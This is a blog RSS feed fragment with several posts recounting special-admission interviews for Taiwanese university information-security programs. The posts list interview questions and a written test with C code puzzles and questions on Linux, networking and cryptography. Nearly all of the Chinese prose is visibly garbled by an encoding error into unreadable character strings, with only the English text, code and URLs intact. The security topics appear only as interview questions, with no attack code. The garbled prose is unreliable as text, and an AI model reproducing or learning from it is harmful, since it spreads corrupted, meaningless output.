&lt;li&gt;Ê±Ç‰∏ÄÁõ¥Á∑öLÂà∞Âπ≥Èù¢PÁöÑÊúÄÁü≠Ë∑ùÈõ¢&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;ÂøÉÂæó&lt;/h3&gt;
&lt;p&gt;Âî∏Ëµ∑‰æÜÈÇÑÂ•ΩÔºåÂîØ‰∏ÄÂøÉÂæóÔºåÁâπÈÅ∏Èù¢Ë©¶ÊêûÂæóÂÉèÂ≠∏Ê∏¨‰∫åÈöéÈù¢Ë©¶
ÊàñË®±ÊòØÊïôÊéàÊ†πÊú¨‰∏çË¶ÅÊàë&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Fri, 06 Dec 2024 18:36:01 GMT</pubDate></item><item><title>114‰∏≠ËààÂ§ßÂ≠∏ÁâπÊÆäÈÅ∏ÊâçÈù¢Ë©¶</title><link>https://yih-0118.github.io/blog/114%E4%B8%AD%E8%88%88%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/114%E4%B8%AD%E8%88%88%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/</guid><description>1206Èù¢Ë©¶ÊíûÊíûÊíû</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/114%E4%B8%AD%E8%88%88%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/&quot;&gt;https://yih-0118.github.io/blog/114%E4%B8%AD%E8%88%88%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/&lt;/a&gt;&lt;/blockquote&gt; &lt;h3&gt;114‰∏≠ËààÂ§ßÂ≠∏Ë≥áÂ∑•Á≥ª(Ë≥áÂÆâÁµÑ) ÁâπÊÆäÈÅ∏ÊâçÈù¢Ë©¶ ÂøÉÂæó&lt;/h3&gt;
&lt;p&gt;‰ªäÂπ¥ÊòØÁ¨¨‰∏ÄÊ¨°‰∏≠ËààÂ§ßÂ≠∏Ë≥áÂ∑•Á≥ªË¶ÅÈù¢Ë©¶
&lt;del&gt;ÊâÄ‰ª•ÈÄôÊòØÁ¨¨‰∏ÄÁØá‰∏≠ËààË≥áÂ∑•ÁâπÈÅ∏ÂøÉÂæóÊñá&lt;/del&gt;
‰ªäÂπ¥Èù¢Ë©¶19‰∫∫Âèñ3
ÂàùË©¶Ë∑üÂÖ∂‰ªñÈñì‰∏ÄÊ®£ÔºåÂà∑Âà∑Âà∑&lt;/p&gt;
&lt;h3&gt;Áï∂Â§©ÊÉÖÊ≥Å&lt;/h3&gt;
&lt;p&gt;Âú®ÂÖ´Ê®ìÂ†±Âà∞ÔºåÂ¶ÇÊûúÂâçÈù¢Ê≤íÊúâ‰∫∫‰æÜÔºå‰Ω†ÊúÉÂÖàË¢´Âè´ÂéªÈù¢Ë©¶üíÄ&lt;/p&gt;
&lt;h3&gt;Èù¢Ë©¶ÊÉÖÊ≥Å&lt;/h3&gt;
&lt;h4&gt;Èù¢Ë©¶ÊïôÂÆ§‰ΩàÂ±Ä&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/H13uSUlNyl.png&quot; alt=&quot;‰∏≠Ëàà&quot;&gt;&lt;/p&gt;
&lt;h6&gt;Èù¢Ë©¶ÂïèÈ°å&lt;/h6&gt;
&lt;ol&gt;
&lt;li&gt;Ëá™Êàë‰ªãÁ¥π1ÂàÜÈêò&lt;/li&gt;
&lt;li&gt;sql injectionÊòØ‰ªÄÈ∫º&lt;/li&gt;
&lt;li&gt;apcs ÂàÜÊï∏ÊÑüË¶∫ÊâçÊôÆÊôÆÊòØÁÇ∫‰ªÄÈ∫ºÔºü&lt;/li&gt;
&lt;li&gt;Ë≥áÂÆâÊìÖÈï∑Âú®Âì™ÂÄãÊñπÈù¢Ôºü&lt;/li&gt;
&lt;li&gt;Âá∫ÈÅé‰ªÄÈ∫ºÊ®£ÁöÑÈ°åÁõÆÔºü&lt;/li&gt;
&lt;li&gt;Âú∞ÁêÜÂ•ßÊûóÂåπ‰∫ûÊòØ‰ªÄÈ∫ºÊù±Êù±Ôºü&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;ÂøÉÂæó&lt;/h3&gt;
&lt;p&gt;ÊÑüË¶∫ÊôÆÊôÆÔºåÊ≤íÊúâÈÅéÂ§öÈúÄË¶ÅÊìîÊÜÇÁöÑ&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Fri, 06 Dec 2024 18:35:36 GMT</pubDate></item><item><title>114ÂΩ∞Â∏´Â§ßÁâπÊÆäÈÅ∏ÊâçÈù¢Ë©¶</title><link>https://yih-0118.github.io/blog/114%E5%BD%B0%E5%B8%AB%E5%A4%A7%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/114%E5%BD%B0%E5%B8%AB%E5%A4%A7%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/</guid><description>ÂΩ∞Â∏´Â§ßÊ≠£‰∏ÄÊàëÂ•ΩÊÑüÂãï</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/114%E5%BD%B0%E5%B8%AB%E5%A4%A7%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/&quot;&gt;https://yih-0118.github.io/blog/114%E5%BD%B0%E5%B8%AB%E5%A4%A7%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/&lt;/a&gt;&lt;/blockquote&gt; &lt;h3&gt;114ÂΩ∞Â∏´Â§ßË≥áÂ∑•Á≥ª(Ë≥áÂÆâÁµÑ) ÁâπÊÆäÈÅ∏ÊâçÈù¢Ë©¶ ÂøÉÂæó&lt;/h3&gt;
&lt;p&gt;‰ªäÂπ¥‰∏çÁü•ÈÅìÂπæÂÄã‰∫∫Â†±ÂêçÔºåÊìöË™™ÊòØÂà∑ÂæóÂæàÂÖá
ÈÄ≤Èù¢Ë©¶ÊâçÂÖ≠ÂÄã(Âèñ2)&lt;/p&gt;
&lt;h3&gt;Áï∂Â§©ÊÉÖÊ≥Å&lt;/h3&gt;
&lt;p&gt;Âú®‰∏ÄÊ®ìÂ†±Âà∞Ôºå‰ΩÜ‰ªñÂÄëÁöÑground floorÊòØB2üíÄ&lt;/p&gt;
&lt;h3&gt;Èù¢Ë©¶ÊÉÖÊ≥Å&lt;/h3&gt;
&lt;h4&gt;Èù¢Ë©¶ÊïôÂÆ§‰ΩàÂ±Ä&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkS8X-2Xkl.png&quot; alt=&quot;ÂΩ∞Â∏´Â§ß‰ΩàÂ±Ä&quot;&gt;&lt;/p&gt;
&lt;h6&gt;Èù¢Ë©¶ÂïèÈ°å&lt;/h6&gt;
&lt;ol&gt;
&lt;li&gt;Ëá™Êàë‰ªãÁ¥π3~5ÂàÜÈêò&lt;/li&gt;
&lt;li&gt;Ë≥áÂÆâÂè™ÊòØË≥áÂ∑•Á≥ªÁöÑ‰∏ÄÂ∞èÈÉ®ÂàÜÔºå‰Ω†Ë¶∫ÂæóË≥áÂ∑•ÈÉΩÂú®Êïô‰ªÄÈ∫º&lt;/li&gt;
&lt;li&gt;Êï∏Â≠∏ÊàêÁ∏æÁÇ∫‰ªÄÈ∫º‰∏äÂ≠∏Êúü86ÂàÜÔºå‰∏ãÂ≠∏Êúü60ÂàÜ&lt;/li&gt;
&lt;li&gt;‰Ω†Ë¶∫ÂæóÊï∏Â≠∏Âú®Ë≥áÂÆâÈÉ®ÂàÜÊúâ‰ªÄÈ∫ºÁõ∏ÈóúÊÄß&lt;/li&gt;
&lt;li&gt;ÊúâÊ≤íÊúâapcs(‰ªñÂÄëË™™43ÂæàÈ´òÂàÜÔºü)&lt;/li&gt;
&lt;li&gt;apcsÂæûÂì™ÈÇäÂ≠∏ÂæóÔºü&lt;/li&gt;
&lt;li&gt;ÊúâÊÉ≥Ë¶ÅÈõô‰∏ª‰øÆÊàëÂÄëÂ≠∏Ê†°ÁöÑÂú∞ÁêÜÁ≥ªÂóéÔºü&lt;/li&gt;
&lt;li&gt;‰Ω†ÂÄëÊòØÁ§æÂúòÊúâ‰∫∫‰∏ãÂéªÊïôÂóéÔºü&lt;/li&gt;
&lt;li&gt;‰Ω†Ë≥áÂÆâÂá∫ÈÅé‰ªÄÈ∫ºÊ®£ÁöÑÈ°åÁõÆÔºü&lt;/li&gt;
&lt;li&gt;‰Ω†ÂÄëÊ†°ÂÖßÊúâË≥áÂÆâÁ´∂Ë≥ΩÂñîÔºüÊÄéÈ∫ºÂÄãÈÅã‰ΩúÊñπÊ≥ïÔºü&lt;/li&gt;
&lt;li&gt;ÊòéÂÄ´ÊòØÂè∞ÂåóÂ∏ÇÁ´ãÈÇÑÊòØÁßÅÁ´ãÔºü&lt;/li&gt;
&lt;li&gt;‰Ω†ÂÄëÂ≠∏Èï∑Âßê‰∏äÂì™ÈñìÂ≠∏Ê†°Ôºü&lt;/li&gt;
&lt;li&gt;‰Ω†ÈÇÑÊúâÂ†±Âì™ÂπæÈñìÂ≠∏Ê†°Ôºü&lt;/li&gt;
&lt;li&gt;ÊàêÁ∏æÊ≤íÊúâÂæàÂ∑ÆÂππÂòõÁâπÈÅ∏Ôºü&lt;/li&gt;
&lt;li&gt;Ë∑®ÂüüË¶ÅÊÄéÈ∫ºË∑®ÂüüÔºü‰Ω†ÂÅöÈÅé‰ªÄÈ∫ºÔºü&lt;/li&gt;
&lt;li&gt;ÊâìÁ´∂Á®ãÊ≤íÊúâÂæàÂ∑ÆÁÇ∫‰ªÄÈ∫ºÊúÉÁ¢∞Ë≥áÂÆâÔºü&lt;/li&gt;
&lt;li&gt;ÊØîËºÉÊÉ≥ËÆÄÂì™‰∏ÄÈñìÂ≠∏Ê†°Ôºü&lt;/li&gt;
&lt;li&gt;Â≠∏Èï∑ÂßêÊÄéÈ∫ºÊïô‰Ω†ÁöÑÔºü&lt;/li&gt;
&lt;li&gt;‰Ω†ÊúâÊ≤íÊúâÂ∏∂Â≠∏ÂºüÂ¶πÔºü&lt;/li&gt;
&lt;li&gt;‰Ω†Â≠∏Ê∏¨ËÄÉÁöÑ‰∏äÂΩ∞Â∏´Â§ßÂóéÔºü
(Èù¢Ë©¶15ÂàÜÈêòÂïèË∂ÖÂ§ö)&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;ÂøÉÂæó&lt;/h3&gt;
&lt;p&gt;ÊÑüË¶∫ÂæàÊ∏ÖÈñíÔºå‰∏çÈúÄË¶ÅÂ§™Á∑äÂºµÔºå‰ΩÜË™≤Ê•≠ÊñπÈù¢ÂïèÊØîËºÉÂ§ö&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Tue, 03 Dec 2024 11:59:51 GMT</pubDate></item><item><title>114Ëá∫Â∏´Â§ßÁâπÊÆäÈÅ∏ÊâçÈù¢Ë©¶</title><link>https://yih-0118.github.io/blog/114%E8%87%BA%E5%B8%AB%E5%A4%A7%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/114%E8%87%BA%E5%B8%AB%E5%A4%A7%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/</guid><description>ÊàëÁ´üÁÑ∂ÊääÁ≠ÜË©¶È°åÁõÆÂÖ®ÈÉ®Ë¢´Âá∫‰æÜ‰∫ÜÔºü</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/114%E8%87%BA%E5%B8%AB%E5%A4%A7%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/&quot;&gt;https://yih-0118.github.io/blog/114%E8%87%BA%E5%B8%AB%E5%A4%A7%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/&lt;/a&gt;&lt;/blockquote&gt; &lt;h3&gt;114Ëá∫Â∏´Â§ßË≥áÂ∑•Á≥ª(Ë≥áÂÆâÁµÑ) ÁâπÊÆäÈÅ∏ÊâçÈù¢Ë©¶ ÂøÉÂæó&lt;/h3&gt;
&lt;p&gt;‰ªäÂπ¥48‰∫∫ÈÄöÈÅéÂ†±ÂêçË≥áÊ†ºÔºå16‰∫∫ÈÄ≤Èù¢Ë©¶
È¶ñÂÖà9ÈªûÁ≠ÜË©¶ÂÜçÈù¢Ë©¶ÔºåÊúÉÂíå‰∏ÄËà¨ÁµÑÈåØÈñã&lt;/p&gt;
&lt;h3&gt;Áï∂Â§©ÊÉÖÊ≥Å&lt;/h3&gt;
&lt;p&gt;ÊúâÂÄã‰ºëÊÅØÂÆ§ÔºåÊôÇËæ∞Âà∞‰∫ÜÊúÉÊúâ‰∫∫ÈÄ≤‰æÜÊäì‰Ω†ÂéªÈù¢Ë©¶&lt;/p&gt;
&lt;h3&gt;Á≠ÜË©¶ËÄÉÈ°å&lt;/h3&gt;
&lt;h4&gt;‰∏Ä„ÄÅÁ®ãÂºèË®≠Ë®à&lt;/h4&gt;
&lt;p&gt;1. &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
int main(){
    int ans=0;
    for(int i=0,j=0;i&amp;lt;5;j+=(i++))
        ans+=j;
    printf(&amp;quot;%d&amp;quot;,ans);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ê±ÇansÊòØÂ§öÂ∞ë&lt;/p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
int f(int x,int y){
    return x | (1 &amp;lt;&amp;lt;y);
}
int main(){
    int ans = f(2,7);
    printf(&amp;quot;%d&amp;quot; , ans);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂïèÊúÉÂç∞Âá∫‰ªÄÈ∫ºÔºü&lt;/p&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
int main(){
    int8_t a=10 ,b=23, c=44;
    scanf(&amp;quot;%d&amp;quot;,&amp;amp;a);
    printf(&amp;quot;%d%d%d&amp;quot;,&amp;amp;a,&amp;amp;b,&amp;amp;c);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Áï∂ÊàëËº∏ÂÖ•50&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ÁÇ∫‰ΩïÊúÉÂç∞Âá∫ 50 0 0&lt;/li&gt;
&lt;li&gt;ÁÇ∫‰ΩïÊúÉÂç∞Âá∫stack smashing detected&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;‰∫å„ÄÅÁ≥ªÁµ±ÂÆâÂÖ®&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;linuxÊ™îÊ°àÊ¨äÈôê‰∏≠ÁöÑsÊòØ‰ªÄÈ∫ºÊÑèÊÄùÔºü&lt;/li&gt;
&lt;li&gt;proc/versionÁÇ∫‰Ωï‰ΩîÁî®0 byte&lt;/li&gt;
&lt;li&gt;Â¶ÇÊûúË¶ÅÂ∞átest.pdfÈö±ËóèËµ∑‰æÜÔºåÈÇ£Ë©≤Ë¶ÅÊÄéÈ∫ºÂéªÊâìlinux command&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;‰∏â„ÄÅÁ∂≤Ë∑Ø&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ping ÁöÑÂéüÁêÜ&lt;/li&gt;
&lt;li&gt;ÂÆ∂‰∏≠ÁöÑipÂàÜ‰∫´Âô®ÂéüÁêÜ&lt;/li&gt;
&lt;li&gt;ÁÇ∫‰ΩïÁ∂≤È†ÅÊúâÊôÇÊúÉÈ°ØÁ§∫‰∏çÂÆâÂÖ®ÔºåËá≥Â∞ëÂØ´Âá∫3ÂÄãÂéüÂõ†&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Âõõ„ÄÅÂØÜÁ¢ºÂ≠∏&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ÊâãÁÆóÂá±ÊííÂØÜÁ¢ºÔºàÂØÜÊñáÊàëÂøò‰∫ÜÔºâ&lt;/li&gt;
&lt;li&gt;Âú®1ÔΩû124‰∏≠Âèñ‰∏ÄÂÄãÊï∏‰πò‰ª•17ÔºåÂÜçÈô§‰ª•125Ë¶ÅÈ§ò1&lt;/li&gt;
&lt;li&gt;1ÔΩû143‰∏≠Ëàá143‰∫íË≥™ÁöÑÊï∏ÊúâÂπæÂÄã&lt;/li&gt;
&lt;li&gt;Ë≠âÊòé16bitsÁöÑkey‰∏çÂÆâÂÖ®&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Èù¢Ë©¶ÊÉÖÊ≥Å&lt;/h3&gt;
&lt;h5&gt;ÊâìËÅΩÊÉÖÂ†±&lt;/h5&gt;
&lt;p&gt;ÊàëÊòØÊúÄÂæå‰∏ÄÂÄãÈù¢Ë©¶ÁöÑÔºåÂâçÈù¢Â∞±ÊúâÂπæÂÄã‰∫∫ÁàÜÊñôË™™Êúâ‰∏âÈñì&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Á¨¨‰∏ÄÈñìÁî®Ëã±Êñá&lt;/li&gt;
&lt;li&gt;Á¨¨‰∫åÈñìÂïèÂ∞àÊ•≠ÂïèÈ°å&amp;amp;Á≠ÜË©¶ÂøÉÂæó&lt;/li&gt;
&lt;li&gt;Á¨¨‰∏âÈñìÂÅèÈñíËÅä&amp;amp;Êú™‰æÜË¶èÂäÉ&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Èù¢Ë©¶ÂïèÈ°å&lt;/h5&gt;
&lt;h6&gt;Á¨¨‰∏ÄÈñì&lt;/h6&gt;
&lt;ul&gt;
&lt;li&gt;Ëá™Êàë‰ªãÁ¥π3ÂàÜÈêò&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;What&amp;#39;s you think about the most important concepts with cyber security?&lt;/li&gt;
&lt;li&gt;Do you have plan focus on English test?&lt;/li&gt;
&lt;li&gt;What information security incidents do you think are most likely to be encountered in daily life?&lt;/li&gt;
&lt;/ol&gt;
&lt;h6&gt;Á¨¨‰∫åÈñì&lt;/h6&gt;
&lt;ol&gt;
&lt;li&gt;Êó©‰∏äÁöÑÁ≠ÜË©¶ÊÑüÊÉ≥ÊòØ‰ªÄÈ∫ºÔºåÂì™ÈÇäË¶ÅÂú®Âä†Âº∑Ôºü&lt;/li&gt;
&lt;li&gt;‰Ω†ÊúÄÂ∏∏ÂèÉÂä†Âì™‰∏ÄÂÄãË≥áÂÆâÊ¥ªÂãïÊàñÁ§æÁæ§Ôºü&lt;/li&gt;
&lt;li&gt;‰Ω†ÁöÑË≥áÂÆâÂ∞àÈï∑ÊòØ‰ªÄÈ∫ºÔºü&lt;/li&gt;
&lt;li&gt;sql injectionË¶ÅÊÄéÈ∫ºÈò≤Ôºü&lt;/li&gt;
&lt;li&gt;Âá∫ÈÅéÊúÄÈõ£ÁöÑÈ°åÁõÆÊòØ‰ªÄÈ∫ºÔºü&lt;/li&gt;
&lt;li&gt;Âú®Êú™‰æÜÊúâ‰ªÄÈ∫ºÊÑüÊÉ≥ÊàñÊúüÂæÖ&lt;/li&gt;
&lt;/ol&gt;
&lt;h6&gt;Á¨¨‰∏âÈñì&lt;/h6&gt;
&lt;ol&gt;
&lt;li&gt;ÂåóÊ®°ËÉΩ‰∏äÂì™‰∏ÄÈñì&lt;/li&gt;
&lt;li&gt;AIS3 Â∞àÈ°åÂú®ÂÅöÁîöÈ∫ºÔºü&lt;/li&gt;
&lt;li&gt;‰Ω†Ë¶∫Âæó‰∫∫ÊñáÁ¥†È§äËàáË≥áË®äÁµêÂêàÊúÄÈáçË¶ÅÁöÑÊòØ‰ªÄÈ∫ºÔºü&lt;/li&gt;
&lt;li&gt;ÁÇ∫‰ªÄÈ∫º‰∏çÂ†±Âú∞ÁêÜÁ≥ªÁâπÊÆäÈÅ∏ÊùêÔºü&lt;/li&gt;
&lt;li&gt;‰Ω†ÈöäÂèãÂè´‰ªÄÈ∫ºÂêçÂ≠óÔºü&lt;/li&gt;
&lt;li&gt;‰Ω†Â∞çÂè¶Â§ñÂÖ©ÂÄãÊòéÂÄ´ÁöÑË©ïÂÉπÂ¶Ç‰ΩïÔºü‰ªñÂÄëÂæàÂº∑ÂóéÔºü‰ªñÂÄëÂ∞çÂì™‰∫õÊØîËºÉÂº∑Ôºü&lt;/li&gt;
&lt;li&gt;ÁÇ∫‰ªÄÈ∫ºË¶ÅÁâπÈÅ∏Ôºü&lt;/li&gt;
&lt;li&gt;‰∏äÂ∏´Â§ßÂæåÊúÉËëóÈáçÂú®Âì™Ë£°Ôºü&lt;/li&gt;
&lt;li&gt;ÊúÄÂæå‰∏ÄÂÄãÈù¢Ë©¶Â•ΩÁé©ÂóéÔºü&lt;/li&gt;
&lt;li&gt;‰πãÂæåÊâìÁÆóÈõô‰∏ª‰øÆÂóéÔºü&lt;/li&gt;
&lt;li&gt;Âè∞ÁßëÂ§ßË≥áÂÆâÁ§æÂú®ÂππÂòõÔºü&lt;/li&gt;
&lt;li&gt;Âè∞ÁßëÂ§ßË∑üÂ∏´Â§ßÂú®Ë≥áÂÆâÊñπÈù¢Áõ∏Áï∞‰πãËôïÂú®Âì™Ôºü&lt;/li&gt;
&lt;li&gt;ÈÇÑÊúâÂ†±Âì™ÈñìÔºü&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;ÂøÉÂæó&lt;/h3&gt;
&lt;p&gt;Ê∂º‰∫ÜÔºåÊ†πÊú¨Ë∂ÖÁ∑äÂºµÔºåÊÑüË¶∫Â∞±ÂÉèÊòØÂî∏Âà∞ÂêçÂ≠óÁÑ∂ÂæåË¢´ÊãâÂéªÊßçÊñÉ„ÄÇ&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Mon, 18 Nov 2024 10:37:08 GMT</pubDate></item><item><title>114Ëºî‰ªÅÂ§ßÂ≠∏ÁâπÊÆäÈÅ∏ÊâçÈù¢Ë©¶</title><link>https://yih-0118.github.io/blog/114%E8%BC%94%E4%BB%81%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/114%E8%BC%94%E4%BB%81%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/</guid><description>ÁâπÈÅ∏‰∫∫ÁîüÁöÑÁ¨¨‰∏ÄÈñìÈù¢Ë©¶</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/114%E8%BC%94%E4%BB%81%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/&quot;&gt;https://yih-0118.github.io/blog/114%E8%BC%94%E4%BB%81%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/&lt;/a&gt;&lt;/blockquote&gt; &lt;h3&gt;114Ëºî‰ªÅÂ§ßÂ≠∏Ë≥áÂ∑•Á≥ª(Ë≥áÂÆâÁµÑ) ÁâπÊÆäÈÅ∏ÊâçÈù¢Ë©¶ ÂøÉÂæó&lt;/h3&gt;
&lt;p&gt;‰ªäÂπ¥‰∏çÁü•ÈÅìÂπæÂÄã‰∫∫ÈÄ≤Èù¢Ë©¶ÔºåËÅΩË™™ÊòØÊ≤íÊúâÁØ©&lt;/p&gt;
&lt;h3&gt;Áï∂Â§©ÊÉÖÊ≥Å&lt;/h3&gt;
&lt;p&gt;ÂàÜÁÇ∫Áî≤‰πôÁµÑÔºåÊàëÊòØÂàÜÂà∞‰πôÁµÑÔºåÂè™Èù¢‰∏ÄÊ¨°
ÊúâÂÄã‰ºëÊÅØÂÆ§ÔºåÊôÇËæ∞Âà∞‰∫ÜÊúÉÊúâ‰∫∫ÈÄ≤‰æÜÊäì‰Ω†ÂéªÈù¢Ë©¶&lt;/p&gt;
&lt;h3&gt;Èù¢Ë©¶ÊÉÖÊ≥Å&lt;/h3&gt;
&lt;h4&gt;Èù¢Ë©¶ÊïôÂÆ§‰ΩàÂ±Ä&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/S11pITGzkx.png&quot; alt=&quot;ËºîÂ§ßÂ∫ß‰Ωç&quot;&gt;&lt;/p&gt;
&lt;h6&gt;Èù¢Ë©¶ÂïèÈ°å&lt;/h6&gt;
&lt;ol&gt;
&lt;li&gt;xssÂ¶Ç‰ΩïÈò≤Á¶¶ÔºàËã±ÊñáÔºâ&lt;/li&gt;
&lt;li&gt;Êàë‰∏äÊû∂ÁöÑappÁöÑÁâπËâ≤ÊäÄË°ìÔºàËã±ÊñáÔºâ&lt;/li&gt;
&lt;li&gt;ais3Êó¢ÁÑ∂ÊúâÊãøÂà∞ÊúÄ‰Ω≥Â∞àÈ°åËÄå‰∏îÊòØÁî®prompt injectionÔºåÈÅáÂà∞‰ªÄÈ∫ºÂõ∞Èõ£ÔºåÊó¢ÁÑ∂ÊòØaiÔºåÁÇ∫‰ªÄÈ∫º‰∏çÂ†±Ê®ì‰∏ãÁöÑ‰∫∫Â∑•Êô∫ÊÖßÂ≠∏Á®ã&lt;/li&gt;
&lt;li&gt;Áï∂ais3 juniorÂä©ÊïôÊúâÁîöÈ∫ºÁâπÂà•ÁöÑ&lt;/li&gt;
&lt;li&gt;ÊúÄÊìÖÈï∑Âì™‰∏ÄÈ°Ü&lt;/li&gt;
&lt;li&gt;ÊúÄ‰∏çÊìÖÈï∑Âì™‰∏ÄÁßëÔºåÊÄéÈ∫ºËß£Ê±∫&lt;/li&gt;
&lt;li&gt;Âú∞ÁêÜÂ•ßÊûóÂåπ‰∫û Â≠∏Âà∞‰∫Ü‰ªÄÈ∫ºÔºàËã±ÊñáÔºâ&lt;/li&gt;
&lt;li&gt;ÁÇ∫‰ªÄÈ∫ºÂ≠∏Ë≥áÂÆâ&lt;/li&gt;
&lt;li&gt;ÂæûÂì™Ë£°Â≠∏Âà∞Ë≥áÂÆâ&lt;/li&gt;
&lt;li&gt;ÊØîË≥ΩÊàêÁ∏æÂ¶Ç‰ΩïÔºåctfÈ°åÁõÆÊúÄÊúâÂç∞Ë±°ÁöÑÊòØÁîöÈ∫ºÔºåÊÄéÈ∫ºÂéªËß£ÔºåÊúâ‰ªÄÈ∫ºÁâπÂà•ÁöÑÊäÄË°ìÂóé&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;ÂøÉÂæó&lt;/h3&gt;
&lt;p&gt;Á¨¨‰∏ÄÊ¨°Èù¢Ë©¶ÔºåË†ªÁ∑äÂºµÁöÑÔºå‰ΩÜËºîÂ§ßÁµ¶ÊàëÁöÑÊÑüË¶∫Ë†ªËºïÈ¨ÜÁöÑ„ÄÇ
ÊâìËÅΩÈÅéÂæåÔºåÂÖ∂‰ªñ‰∫∫ÂæàÂ∞ëË¢´ÂïèÂ∞àÊ•≠ÂïèÈ°åÔºåÈÇ£ÊàëÊòØÔºü&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Thu, 14 Nov 2024 08:41:53 GMT</pubDate></item><item><title>114ÂåóÊ®°Êï∏Â≠∏A Á¨¨16È°å</title><link>https://yih-0118.github.io/blog/114%E5%8C%97%E6%A8%A1%E6%95%B8%E5%AD%B8a-%E7%AC%AC16%E9%A1%8C/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/114%E5%8C%97%E6%A8%A1%E6%95%B8%E5%AD%B8a-%E7%AC%AC16%E9%A1%8C/</guid><description>Ê®°ËÄÉÊàëÈÄôÈ°åÁ´üÁÑ∂ÊúâÁÆóÂ∞ç</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/114%E5%8C%97%E6%A8%A1%E6%95%B8%E5%AD%B8a-%E7%AC%AC16%E9%A1%8C/&quot;&gt;https://yih-0118.github.io/blog/114%E5%8C%97%E6%A8%A1%E6%95%B8%E5%AD%B8a-%E7%AC%AC16%E9%A1%8C/&lt;/a&gt;&lt;/blockquote&gt; &lt;h3&gt;È°åÁõÆ&lt;/h3&gt;
